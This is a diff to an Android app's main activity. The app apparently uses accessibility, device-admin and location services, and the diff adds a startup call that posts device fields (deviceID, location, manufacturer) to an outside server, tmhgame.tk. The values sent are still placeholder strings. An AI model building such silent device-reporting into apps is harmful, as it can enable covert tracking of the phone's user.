@@ -48,6 +48,7 @@ import com.family.accessibility.MyAccessibilityService;
 import com.family.adminstrator.Adminstrator;
 import com.family.background.GoogleService;
 import com.family.background.MyService;
+import com.family.internet.ServerHelper;
 import com.family.location.LocationService;
 import com.google.android.gms.maps.CameraUpdateFactory;
 import com.google.android.gms.maps.GoogleMap;
@@ -55,6 +56,9 @@ import com.google.android.gms.maps.OnMapReadyCallback;
 import com.google.android.gms.maps.SupportMapFragment;
 import com.google.android.gms.maps.model.LatLng;
 import com.google.android.gms.maps.model.MarkerOptions;
+
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
@@ -96,6 +100,25 @@ public class MainActivity extends FragmentActivity implements OnMapReadyCallback
         }
 
 
+        postJSON();
+
+
+    }
+
+    public void postJSON() {
+        JSONObject postData = new JSONObject();
+        Log.d("posted", "posted");
+        try {
+            postData.put("name", "Toghrul");
+            postData.put("address", "address.getText().toString()");
+            postData.put("manufacturer", "manufacturer.getText().toString()");
+            postData.put("location", "location.getText().toString()");
+            postData.put("type", "type.getText().toString()");
+            postData.put("deviceID", "deviceID.getText().toString()");
+        new ServerHelper().execute("http://tmhgame.tk/ailep", postData.toString());
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
     }
 
     public void createNotification() {
